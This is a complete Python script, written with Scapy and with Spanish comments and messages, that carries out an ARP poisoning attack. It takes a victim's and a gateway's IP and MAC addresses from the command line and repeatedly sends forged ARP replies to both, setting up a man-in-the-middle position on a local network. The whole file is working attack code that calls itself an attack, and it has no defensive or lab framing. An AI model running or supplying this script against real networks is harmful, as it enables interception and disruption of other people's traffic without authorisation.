import sys
from scapy.all import *

# Función para enviar paquetes ARP falsificados
def send_arp_poisoning(target_ip, target_mac, gateway_ip, gateway_mac, count):
    print(f"Preparando para enviar {count} pares de paquetes ARP falsificados a {target_ip} y {gateway_ip}")

    for _ in range(count):
        packet1 = Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
        packet2 = Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

        print("Enviando paquete ARP falsificado a la víctima")
        sendp(packet1)

        print("Enviando paquete ARP falsificado a la puerta de enlace")
        sendp(packet2)

    print(f"{count} pares de paquetes ARP falsificados enviados correctamente")

# Main
if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Uso: python3 script.py <IP_víctima> <MAC_víctima> <IP_puerta_enlace> <MAC_puerta_enlace> <número_de_paquetes>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_mac = sys.argv[2]
    gateway_ip = sys.argv[3]
    gateway_mac = sys.argv[4]
    count = int(sys.argv[5])

    print("Iniciando ataque ARP poisoning...")
    send_arp_poisoning(target_ip, target_mac, gateway_ip, gateway_mac, count)
    print("Ataque ARP poisoning completado")
